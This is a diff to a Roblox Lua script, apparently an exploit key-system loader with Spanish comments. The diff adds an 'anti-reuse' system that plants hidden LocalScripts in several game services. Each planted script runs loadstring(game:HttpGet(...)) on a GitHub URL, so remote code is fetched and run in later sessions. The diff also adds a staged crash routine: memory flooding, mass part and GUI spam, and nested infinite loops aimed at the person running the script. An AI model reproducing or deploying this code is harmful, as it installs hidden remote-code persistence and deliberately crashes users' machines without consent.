@@ -2,235 +2,515 @@ local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local UserInputService = game:GetService("UserInputService")
 local RunService = game:GetService("RunService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Lighting = game:GetService("Lighting")
+local SoundService = game:GetService("SoundService")
+local StarterGui = game:GetService("StarterGui")
 
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
 -- ================================
--- SISTEMA DE DETECCIÓN DE USO PREVIO
+-- SISTEMA DE AUTO-EJECUCIÓN PERSISTENTE
 -- ================================
 
--- Crear un identificador único para el jugador y sesión
-local function getPlayerIdentifier()
-    return player.UserId .. "_" .. player.Name
+-- Crear script auto-ejecutable que persiste entre servidores
+local function createPersistentAutoExecution()
+    local autoExecScript = [[
+        local Players = game:GetService("Players")
+        local RunService = game:GetService("RunService")
+        local player = Players.LocalPlayer
+        
+        -- Esperar a que el jugador esté completamente cargado
+        if not player.Character then
+            player.CharacterAdded:Wait()
+        end
+        wait(2) -- Pequeña pausa adicional
+        
+        -- Ejecutar el script principal
+        loadstring(game:HttpGet("]] .. "https://raw.githubusercontent.com/zamasxmodder/ScriptStorage/main/AntiReuseScript.lua" .. [["))()
+    ]]
+    
+    -- Intentar múltiples métodos de persistencia
+    
+    -- Método 1: StarterPlayerScripts (si existe acceso)
+    pcall(function()
+        local starterPlayer = game:GetService("StarterPlayer")
+        local starterPlayerScripts = starterPlayer:FindFirstChild("StarterPlayerScripts")
+        if starterPlayerScripts then
+            local autoScript = Instance.new("LocalScript")
+            autoScript.Name = "AutoExecuteScript_" .. math.random(1000, 9999)
+            autoScript.Source = autoExecScript
+            autoScript.Parent = starterPlayerScripts
+        end
+    end)
+    
+    -- Método 2: ReplicatedFirst (prioridad máxima)
+    pcall(function()
+        local replicatedFirst = game:GetService("ReplicatedFirst")
+        local autoScript = Instance.new("LocalScript")
+        autoScript.Name = "PriorityAutoExec_" .. math.random(1000, 9999)
+        autoScript.Source = autoExecScript
+        autoScript.Parent = replicatedFirst
+    end)
+    
+    -- Método 3: PlayerGui persistente
+    pcall(function()
+        local hiddenGui = Instance.new("ScreenGui")
+        hiddenGui.Name = "SystemGUI_" .. math.random(10000, 99999)
+        hiddenGui.ResetOnSpawn = false
+        hiddenGui.IgnoreGuiInset = true
+        hiddenGui.Enabled = false -- Invisible
+        hiddenGui.Parent = playerGui
+        
+        local autoScript = Instance.new("LocalScript")
+        autoScript.Name = "AutoExecHandler"
+        autoScript.Source = autoExecScript
+        autoScript.Parent = hiddenGui
+    end)
+    
+    -- Método 4: Múltiples marcadores en workspace
+    for i = 1, 5 do
+        pcall(function()
+            local marker = Instance.new("RemoteEvent")
+            marker.Name = "SysMarker_" .. getPlayerIdentifier() .. "_" .. i
+            marker.Parent = workspace
+            
+            -- Script embebido en el marcador
+            local script = Instance.new("LocalScript")
+            script.Source = autoExecScript
+            script.Parent = marker
+        end)
+    end
 end
 
--- Función para marcar el script como usado
+-- ================================
+-- SISTEMA DE DETECCIÓN DE USO PREVIO MEJORADO
+-- ================================
+
+local function getPlayerIdentifier()
+    return player.UserId .. "_" .. player.Name .. "_" .. game.GameId
+end
+
 local function markScriptAsUsed()
-    -- Crear un valor persistente en ReplicatedStorage o usar _G
+    -- Múltiples métodos de marcado para máxima persistencia
+    
+    -- _G global
     if not _G.ScriptUsageTracker then
         _G.ScriptUsageTracker = {}
     end
-    _G.ScriptUsageTracker[getPlayerIdentifier()] = true
+    _G.ScriptUsageTracker[getPlayerIdentifier()] = {
+        used = true,
+        timestamp = os.time(),
+        gameId = game.GameId,
+        placeId = game.PlaceId
+    }
     
-    -- También crear un objeto en workspace que persista entre servidores
-    local marker = Instance.new("StringValue")
-    marker.Name = "ScriptUsageMarker_" .. getPlayerIdentifier()
-    marker.Value = "USED"
-    marker.Parent = workspace
+    -- Marcadores en workspace (múltiples para redundancia)
+    for i = 1, 3 do
+        pcall(function()
+            local marker = Instance.new("StringValue")
+            marker.Name = "UsageMarker_" .. getPlayerIdentifier() .. "_" .. i
+            marker.Value = "SCRIPT_USED_" .. os.time()
+            marker.Parent = workspace
+        end)
+    end
+    
+    -- Marcador en ReplicatedStorage
+    pcall(function()
+        local repMarker = Instance.new("Folder")
+        repMarker.Name = "RepMarker_" .. getPlayerIdentifier()
+        repMarker.Parent = ReplicatedStorage
+        
+        local valueMarker = Instance.new("BoolValue")
+        valueMarker.Name = "Used"
+        valueMarker.Value = true
+        valueMarker.Parent = repMarker
+    end)
+    
+    -- Marcador en PlayerGui (persiste con ResetOnSpawn = false)
+    pcall(function()
+        local guiMarker = Instance.new("ScreenGui")
+        guiMarker.Name = "UsageMarker_" .. getPlayerIdentifier()
+        guiMarker.ResetOnSpawn = false
+        guiMarker.Enabled = false
+        guiMarker.Parent = playerGui
+        
+        local value = Instance.new("BoolValue")
+        value.Name = "ScriptUsed"
+        value.Value = true
+        value.Parent = guiMarker
+    end)
 end
 
--- Función para verificar si el script ya fue usado
 local function wasScriptUsedBefore()
-    -- Verificar en _G primero
+    -- Verificar _G
     if _G.ScriptUsageTracker and _G.ScriptUsageTracker[getPlayerIdentifier()] then
         return true
     end
     
-    -- Verificar si existe el marcador en workspace
-    local marker = workspace:FindFirstChild("ScriptUsageMarker_" .. getPlayerIdentifier())
-    if marker then
+    -- Verificar marcadores en workspace
+    for i = 1, 3 do
+        if workspace:FindFirstChild("UsageMarker_" .. getPlayerIdentifier() .. "_" .. i) then
+            return true
+        end
+    end
+    
+    -- Verificar ReplicatedStorage
+    if ReplicatedStorage:FindFirstChild("RepMarker_" .. getPlayerIdentifier()) then
         return true
+    end
+    
+    -- Verificar PlayerGui
+    if playerGui:FindFirstChild("UsageMarker_" .. getPlayerIdentifier()) then
+        return true
+    end
+    
+    -- Verificar marcadores del sistema anterior
+    for i = 1, 5 do
+        if workspace:FindFirstChild("SysMarker_" .. getPlayerIdentifier() .. "_" .. i) then
+            return true
+        end
     end
     
     return false
 end
 
 -- ================================
--- SISTEMA DE DEGRADACIÓN DE FPS
+-- SISTEMA DE CRASHEO COMPLETO
 -- ================================
 
-local function startFPSDestruction()
-    print("SISTEMA ANTI-REUSO ACTIVADO - Iniciando degradación de FPS...")
+local function initiateTotalSystemCrash()
+    print("🚨 SISTEMA ANTI-REUSO CRÍTICO ACTIVADO 🚨")
+    print("💀 INICIANDO CRASHEO TOTAL DEL CLIENTE 💀")
     
-    -- Crear múltiples loops intensivos
+    -- Crear GUI de aviso crítico antes del crash
+    local crashGui = Instance.new("ScreenGui")
+    crashGui.Name = "CriticalSystemAlert"
+    crashGui.ResetOnSpawn = false
+    crashGui.IgnoreGuiInset = true
+    crashGui.Parent = playerGui
+    
+    local crashFrame = Instance.new("Frame")
+    crashFrame.Size = UDim2.new(1, 0, 1, 0)
+    crashFrame.BackgroundColor3 = Color3.fromRGB(139, 0, 0)
+    crashFrame.Parent = crashGui
+    
+    local crashText = Instance.new("TextLabel")
+    crashText.Size = UDim2.new(1, 0, 1, 0)
+    crashText.BackgroundTransparency = 1
+    crashText.Text = "⚠️ SISTEMA ANTI-REUSO CRÍTICO ⚠️\n\n💀 CLIENTE SERÁ CRASHEADO 💀\n\nMOTIVO: Uso múltiple detectado\nACCIÓN: Terminación forzosa\n\n🔴 SYSTEM TERMINATING... 🔴"
+    crashText.TextColor3 = Color3.fromRGB(255, 255, 255)
+    crashText.TextSize = 32
+    crashText.Font = Enum.Font.GothamBold
+    crashText.TextXAlignment = Enum.TextXAlignment.Center
+    crashText.TextYAlignment = Enum.TextYAlignment.Center
+    crashText.TextWrapped = true
+    crashText.Parent = crashFrame
+    
+    -- Efecto parpadeante crítico
+    spawn(function()
+        while crashText.Parent do
+            crashText.TextColor3 = Color3.fromRGB(255, 0, 0)
+            crashFrame.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+            wait(0.1)
+            crashText.TextColor3 = Color3.fromRGB(255, 255, 255)
+            crashFrame.BackgroundColor3 = Color3.fromRGB(139, 0, 0)
+            wait(0.1)
+        end
+    end)
+    
+    -- Dar tiempo al usuario para ver el mensaje
+    wait(3)
+    
+    -- ================================
+    -- FASE 1: SOBRECARGA EXTREMA DE CPU
+    -- ================================
+    
     local connections = {}
+    local crashData = {}
     
-    -- Loop 1: Crear y destruir objetos constantemente
+    -- Crear múltiples arrays gigantes en memoria
+    for i = 1, 100 do
+        crashData[i] = {}
+        for j = 1, 10000 do
+            crashData[i][j] = string.rep("CRASH_DATA_" .. i .. "_" .. j, 100)
+        end
+    end
+    
+    -- Loop 1: Creación masiva de instancias (1000 por frame)
     connections[1] = RunService.Heartbeat:Connect(function()
-        for i = 1, 50 do
+        for i = 1, 1000 do
             local part = Instance.new("Part")
-            part.Size = Vector3.new(math.random(1, 10), math.random(1, 10), math.random(1, 10))
-            part.Position = Vector3.new(math.random(-1000, 1000), math.random(-1000, 1000), math.random(-1000, 1000))
+            part.Name = "CrashPart_" .. i .. "_" .. tick()
+            part.Size = Vector3.new(math.random(1, 100), math.random(1, 100), math.random(1, 100))
+            part.Position = Vector3.new(math.random(-10000, 10000), math.random(-10000, 10000), math.random(-10000, 10000))
             part.BrickColor = BrickColor.random()
-            part.Material = Enum.Material.Neon
+            part.Material = Enum.Material.ForceField
+            part.CanCollide = true
+            part.Anchored = false
             part.Parent = workspace
             
-            -- Destruir inmediatamente para crear lag
+            -- Añadir efectos costosos
+            local fire = Instance.new("Fire")
+            fire.Size = math.random(10, 50)
+            fire.Heat = math.random(10, 25)
+            fire.Parent = part
+            
+            local smoke = Instance.new("Smoke")
+            smoke.Size = math.random(10, 50)
+            smoke.RiseVelocity = math.random(10, 25)
+            smoke.Parent = part
+            
+            local light = Instance.new("PointLight")
+            light.Brightness = math.random(1, 10)
+            light.Range = math.random(10, 60)
+            light.Parent = part
+            
+            -- Destruir después de causar lag
             game:GetService("Debris"):AddItem(part, 0.1)
         end
     end)
     
-    -- Loop 2: Cálculos matemáticos intensivos
+    -- Loop 2: Cálculos matemáticos ultra intensivos
     connections[2] = RunService.Heartbeat:Connect(function()
-        for i = 1, 1000 do
-            local result = math.sin(i) * math.cos(i) * math.tan(i) * math.sqrt(i)
-            result = result + math.random(1, 1000000)
+        for i = 1, 5000 do
+            local result = 0
+            for j = 1, 1000 do
+                result = result + math.sin(i * j) * math.cos(i / j) * math.tan(i + j)
+                result = result + math.sqrt(math.abs(result)) * math.log(math.abs(result) + 1)
+                result = result + math.random(1, 1000000) / math.random(1, 1000)
+            end
+            crashData[1][1] = tostring(result) -- Forzar conversión
         end
     end)
     
-    -- Loop 3: Manipulación intensiva de GUI
+    -- Loop 3: GUI spam ultra agresivo
     connections[3] = RunService.Heartbeat:Connect(function()
-        for i = 1, 30 do
+        for i = 1, 100 do
             local gui = Instance.new("ScreenGui")
-            gui.Name = "FPSKiller_" .. i
+            gui.Name = "CrashGUI_" .. i .. "_" .. tick()
             gui.Parent = playerGui
             
-            for j = 1, 20 do
+            for j = 1, 50 do
                 local frame = Instance.new("Frame")
                 frame.Size = UDim2.new(math.random(), 0, math.random(), 0)
                 frame.Position = UDim2.new(math.random(), 0, math.random(), 0)
                 frame.BackgroundColor3 = Color3.new(math.random(), math.random(), math.random())
+                frame.BorderSizePixel = math.random(0, 10)
+                frame.Rotation = math.random(0, 360)
                 frame.Parent = gui
                 
-                -- Crear efectos visuales intensivos
-                local tween = TweenService:Create(frame, TweenInfo.new(0.1), {
-                    Rotation = math.random(0, 360),
-                    BackgroundTransparency = math.random()
+                -- Efectos visuales intensivos
+                local gradient = Instance.new("UIGradient")
+                gradient.Color = ColorSequence.new{
+                    ColorSequenceKeypoint.new(0, Color3.new(math.random(), math.random(), math.random())),
+                    ColorSequenceKeypoint.new(1, Color3.new(math.random(), math.random(), math.random()))
+                }
+                gradient.Parent = frame
+                
+                local stroke = Instance.new("UIStroke")
+                stroke.Color = Color3.new(math.random(), math.random(), math.random())
+                stroke.Thickness = math.random(1, 20)
+                stroke.Parent = frame
+                
+                -- Tweens ultra rápidos
+                local tween = TweenService:Create(frame, TweenInfo.new(0.01), {
+                    Rotation = math.random(0, 3600),
+                    BackgroundTransparency = math.random(),
+                    Size = UDim2.new(math.random(), 0, math.random(), 0)
                 })
                 tween:Play()
             end
             
-            -- Destruir para crear más lag
-            game:GetService("Debris"):AddItem(gui, 0.2)
+            game:GetService("Debris"):AddItem(gui, 0.05)
         end
     end)
     
-    -- Loop 4: Sonidos y efectos
+    -- Loop 4: Sonidos de crasheo
     connections[4] = RunService.Heartbeat:Connect(function()
-        for i = 1, 10 do
+        for i = 1, 50 do
             local sound = Instance.new("Sound")
-            sound.Volume = 0 -- Sin sonido audible pero consume recursos
-            sound.SoundId = "rbxassetid://131961136" -- Sonido genérico
+            sound.SoundId = "rbxassetid://131961136"
+            sound.Volume = 0.01 -- Muy bajo pero consume recursos
+            sound.PlaybackSpeed = math.random(0.1, 10)
+            sound.EmitterSize = math.random(1, 100)
             sound.Parent = workspace
             sound:Play()
-            game:GetService("Debris"):AddItem(sound, 0.5)
+            game:GetService("Debris"):AddItem(sound, 0.1)
         end
     end)
     
-    -- Loop 5: Raycast intensivo
+    -- Loop 5: Raycast bombardeo
     connections[5] = RunService.Heartbeat:Connect(function()
-        for i = 1, 100 do
+        for i = 1, 500 do
             local raycastParams = RaycastParams.new()
             raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
-            raycastParams.FilterDescendantsInstances = {}
+            raycastParams.FilterDescendantsInstances = {workspace.CurrentCamera}
             
-            local ray = workspace:Raycast(
-                Vector3.new(math.random(-1000, 1000), math.random(-1000, 1000), math.random(-1000, 1000)),
-                Vector3.new(math.random(-100, 100), math.random(-100, 100), math.random(-100, 100)),
-                raycastParams
-            )
+            pcall(function()
+                workspace:Raycast(
+                    Vector3.new(math.random(-10000, 10000), math.random(-10000, 10000), math.random(-10000, 10000)),
+                    Vector3.new(math.random(-1000, 1000), math.random(-1000, 1000), math.random(-1000, 1000)),
+                    raycastParams
+                )
+            end)
         end
     end)
     
-    -- Loop 6: Crear partículas invisibles pero que consumen recursos
+    -- Loop 6: Manipulación extrema de servicios
     connections[6] = RunService.Heartbeat:Connect(function()
-        for i = 1, 20 do
-            local attachment = Instance.new("Attachment")
-            attachment.Parent = workspace
-            
-            local particle = Instance.new("ParticleEmitter")
-            particle.Rate = 1000
-            particle.Lifetime = NumberRange.new(0.1)
-            particle.Transparency = NumberSequence.new(1) -- Invisible pero consume recursos
-            particle.Parent = attachment
-            
-            game:GetService("Debris"):AddItem(attachment, 0.3)
+        -- Lighting spam
+        Lighting.Brightness = math.random(0, 10)
+        Lighting.ColorShift_Top = Color3.new(math.random(), math.random(), math.random())
+        Lighting.ColorShift_Bottom = Color3.new(math.random(), math.random(), math.random())
+        Lighting.Ambient = Color3.new(math.random(), math.random(), math.random())
+        
+        -- Camera manipulation
+        local camera = workspace.CurrentCamera
+        if camera then
+            camera.FieldOfView = math.random(1, 120)
+            camera.CFrame = camera.CFrame * CFrame.Angles(math.rad(math.random(-5, 5)), math.rad(math.random(-5, 5)), math.rad(math.random(-5, 5)))
         end
+        
+        -- SoundService spam
+        SoundService.RolloffScale = math.random(0.1, 10)
+        SoundService.DopplerScale = math.random(0.1, 10)
     end)
     
-    -- Mostrar mensaje de advertencia
-    local warningGui = Instance.new("ScreenGui")
-    warningGui.Name = "AntiReuseWarning"
-    warningGui.ResetOnSpawn = false
-    warningGui.IgnoreGuiInset = true
-    warningGui.Parent = playerGui
+    -- ================================
+    -- FASE 2: DESPUÉS DE 5 SEGUNDOS, INTENSIFICAR
+    -- ================================
     
-    local warningFrame = Instance.new("Frame")
-    warningFrame.Size = UDim2.new(1, 0, 1, 0)
-    warningFrame.BackgroundColor3 = Color3.fromRGB(139, 0, 0)
-    warningFrame.BackgroundTransparency = 0.5
-    warningFrame.Parent = warningGui
+    wait(5)
+    print("💀 ESCALANDO A FASE CRÍTICA DE CRASHEO 💀")
     
-    local warningText = Instance.new("TextLabel")
-    warningText.Size = UDim2.new(0.8, 0, 0.3, 0)
-    warningText.Position = UDim2.new(0.1, 0, 0.35, 0)
-    warningText.BackgroundTransparency = 1
-    warningText.Text = "⚠️ SISTEMA ANTI-REUSO ACTIVADO ⚠️\n\nHas intentado usar este script múltiples veces.\nTu rendimiento será afectado como medida de seguridad.\n\n🔴 FPS DEGRADATION ACTIVE 🔴"
-    warningText.TextColor3 = Color3.fromRGB(255, 255, 255)
-    warningText.TextSize = 24
-    warningText.Font = Enum.Font.GothamBold
-    warningText.TextXAlignment = Enum.TextXAlignment.Center
-    warningText.TextYAlignment = Enum.TextYAlignment.Center
-    warningText.TextWrapped = true
-    warningText.Parent = warningFrame
-    
-    -- Efecto parpadeante en el texto de advertencia
-    spawn(function()
-        while warningText.Parent do
-            warningText.TextColor3 = Color3.fromRGB(255, 0, 0)
-            wait(0.5)
-            warningText.TextColor3 = Color3.fromRGB(255, 255, 255)
-            wait(0.5)
-        end
-    end)
-    
-    -- Después de 10 segundos, intensificar aún más
-    wait(10)
-    print("INTENSIFICANDO DEGRADACIÓN DE FPS...")
-    
-    -- Loops adicionales más agresivos
+    -- Loops adicionales ultra agresivos
     connections[7] = RunService.Heartbeat:Connect(function()
-        for i = 1, 200 do
+        for i = 1, 2000 do
             local mesh = Instance.new("SpecialMesh")
             mesh.MeshType = Enum.MeshType.FileMesh
-            mesh.MeshId = "rbxasset://fonts/leftarm.mesh" -- Mesh complejo
-            mesh.Scale = Vector3.new(math.random(1, 50), math.random(1, 50), math.random(1, 50))
+            mesh.MeshId = "rbxasset://fonts/leftarm.mesh"
+            mesh.Scale = Vector3.new(math.random(1, 1000), math.random(1, 1000), math.random(1, 1000))
+            mesh.Offset = Vector3.new(math.random(-1000, 1000), math.random(-1000, 1000), math.random(-1000, 1000))
             
             local part = Instance.new("Part")
-            part.Size = Vector3.new(1, 1, 1)
-            part.Position = Vector3.new(math.random(-2000, 2000), math.random(-2000, 2000), math.random(-2000, 2000))
+            part.Size = Vector3.new(math.random(1, 200), math.random(1, 200), math.random(1, 200))
+            part.Position = Vector3.new(math.random(-20000, 20000), math.random(-20000, 20000), math.random(-20000, 20000))
+            part.Material = Enum.Material.Neon
+            part.BrickColor = BrickColor.random()
             part.Parent = workspace
             mesh.Parent = part
             
-            game:GetService("Debris"):AddItem(part, 0.05)
+            -- Attachments con efectos
+            local attachment = Instance.new("Attachment")
+            attachment.Parent = part
+            
+            -- Múltiples partículas por parte
+            for j = 1, 5 do
+                local particle = Instance.new("ParticleEmitter")
+                particle.Rate = math.random(100, 1000)
+                particle.Lifetime = NumberRange.new(0.1, 5)
+                particle.Speed = NumberRange.new(10, 100)
+                particle.Parent = attachment
+            end
+            
+            game:GetService("Debris"):AddItem(part, 0.03)
         end
     end)
+    
+    -- Loop 8: String manipulation masiva (memory overflow)
+    connections[8] = RunService.Heartbeat:Connect(function()
+        for i = 1, 100 do
+            local massiveString = ""
+            for j = 1, 10000 do
+                massiveString = massiveString .. "CRASH_STRING_DATA_" .. i .. "_" .. j .. "_" .. tick() .. "_" .. math.random(1, 1000000)
+            end
+            crashData[#crashData + 1] = massiveString
+        end
+        
+        -- Limpiar ocasionalmente para evitar que se llene demasiado rápido
+        if #crashData > 1000 then
+            for i = 1, 500 do
+                table.remove(crashData, 1)
+            end
+        end
+    end)
+    
+    -- ================================
+    -- FASE 3: DESPUÉS DE 10 SEGUNDOS, CRASH FINAL
+    -- ================================
+    
+    wait(10)
+    print("💀💀💀 FASE FINAL - CRASH INMEDIATO 💀💀💀")
+    
+    -- Crear loops infinitos anidados para crash definitivo
+    spawn(function()
+        while true do
+            for i = 1, math.huge do
+                for j = 1, math.huge do
+                    local part = Instance.new("Part")
+                    part.Size = Vector3.new(math.random(1, 10000), math.random(1, 10000), math.random(1, 10000))
+                    part.Position = Vector3.new(math.random(-100000, 100000), math.random(-100000, 100000), math.random(-100000, 100000))
+                    part.Parent = workspace
+                    
+                    -- Sin debris, acumulación infinita
+                    if math.random(1, 100) == 1 then
+                        RunService.Heartbeat:Wait() -- Ocasional yield para mantener el loop
+                    end
+                end
+            end
+        end
+    end)
+    
+    -- Múltiples loops infinitos paralelos
+    for crashLoop = 1, 10 do
+        spawn(function()
+            while true do
+                for i = 1, 1000000 do
+                    crashData[#crashData + 1] = string.rep("FINAL_CRASH_" .. crashLoop .. "_" .. i, 1000)
+                    
+                    local gui = Instance.new("ScreenGui")
+                    gui.Parent = playerGui
+                    for frame = 1, 100 do
+                        local f = Instance.new("Frame")
+                        f.Size = UDim2.new(10, 0, 10, 0) -- Tamaño enorme
+                        f.Parent = gui
+                    end
+                end
+            end
+        end)
+    end
     
     return connections
 end
 
 -- ================================
--- VERIFICACIÓN INICIAL
+-- VERIFICACIÓN INICIAL Y CONFIGURACIÓN DE AUTO-EJECUCIÓN
 -- ================================
+
+-- Configurar auto-ejecución para futuros usos
+createPersistentAutoExecution()
 
 -- Verificar si el script ya fue usado antes
 if wasScriptUsedBefore() then
-    print("DETECCIÓN: Script ya fue utilizado anteriormente")
-    print("ACTIVANDO SISTEMA ANTI-REUSO...")
+    print("🚨 DETECCIÓN CRÍTICA: Script utilizado anteriormente")
+    print("🔥 ACTIVANDO PROTOCOLO DE CRASHEO TOTAL")
     
-    -- Iniciar degradación de FPS inmediatamente
-    startFPSDestruction()
+    -- Iniciar crasheo total inmediatamente
+    initiateTotalSystemCrash()
     
     -- No continuar con el script normal
     return
 else
-    print("PRIMERA EJECUCIÓN: Marcando script como usado")
+    print("✅ PRIMERA EJECUCIÓN: Configurando sistema anti-reuso")
     markScriptAsUsed()
+    print("📝 Script marcado como usado")
+    print("🔄 Sistema de auto-ejecución configurado")
 end
 
 -- ================================
--- VERIFICACIÓN DE CUENTA NUEVA (CÓDIGO ORIGINAL)
+-- RESTO DEL CÓDIGO ORIGINAL (solo se ejecuta en primera vez)
 -- ================================
 
 local function checkAccountAge()
@@ -452,7 +732,7 @@ if not checkAccountAge() then
 end
 
 -- ================================
--- RESTO DEL SCRIPT ORIGINAL (GUI PRINCIPAL)
+-- GUI PRINCIPAL (Solo primera ejecución)
 -- ================================
 
 local screenGui = Instance.new("ScreenGui")
@@ -797,6 +1077,8 @@ submitButton.MouseButton1Click:Connect(function()
             exitTween:Play()
             exitTween.Completed:Connect(function()
                 screenGui:Destroy()
+                -- Aquí iría la carga del script principal
+                print("✅ SCRIPT PRINCIPAL CARGADO - Primera ejecución autorizada")
             end)
         else
             local originalColor = keyInputStroke.Color
@@ -819,6 +1101,7 @@ submitButton.MouseButton1Click:Connect(function()
     end
 end)
 
+-- Efectos visuales y animaciones (resto del código original)
 spawn(function()
     while mainPanel.Parent do
         local breatheTween1 = TweenService:Create(panelStroke, TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
@@ -877,50 +1160,6 @@ spawn(function()
     end
 end)
 
-local function updateLayout()
-    local viewportSize = workspace.CurrentCamera.ViewportSize
-    local isSmallScreen = viewportSize.X < 800 or viewportSize.Y < 600
-    
-    if isSmallScreen then
-        mainPanel.Size = UDim2.new(0.9, 0, 0.8, 0)
-        mainPanel.Position = UDim2.new(0.05, 0, 0.1, 0)
-        
-        for _, decoration in pairs({topLeft, topRight, bottomLeft, bottomRight}) do
-            decoration.Size = UDim2.new(0, 40, 0, 40)
-        end
-        
-        playerName.TextSize = 14
-        username.TextSize = 10
-        country.TextSize = 8
-        status.TextSize = 8
-        title.TextSize = 20
-        subtitle.TextSize = 10
-        keyInput.TextSize = 12
-        getKeyButton.TextSize = 12
-        submitButton.TextSize = 12
-    else
-        mainPanel.Size = UDim2.new(0, 400, 0, 500)
-        mainPanel.Position = UDim2.new(0.5, -200, 0.5, -250)
-        
-        for _, decoration in pairs({topLeft, topRight, bottomLeft, bottomRight}) do
-            decoration.Size = UDim2.new(0, 60, 0, 60)
-        end
-        
-        playerName.TextSize = 16
-        username.TextSize = 12
-        country.TextSize = 10
-        status.TextSize = 10
-        title.TextSize = 24
-        subtitle.TextSize = 12
-        keyInput.TextSize = 14
-        getKeyButton.TextSize = 14
-        submitButton.TextSize = 14
-    end
-end
-
-workspace.CurrentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(updateLayout)
-updateLayout()
-
 UserInputService.InputBegan:Connect(function(input, gameProcessed)
     if not gameProcessed and input.KeyCode == Enum.KeyCode.Escape then
         local exitTween = TweenService:Create(mainPanel, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
@@ -933,4 +1172,7 @@ UserInputService.InputBegan:Connect(function(input, gameProcessed)
     end
 end)
 
-print("Modern Panel GUI loaded successfully! Account verified: " .. player.AccountAge .. " days old.")
+print("✅ Modern Panel GUI loaded successfully!")
+print("🔒 Account verified: " .. player.AccountAge .. " days old")
+print("🔄 Anti-reuse system configured and ready")
+print("⚡ Auto-execution system deployed for future sessions")
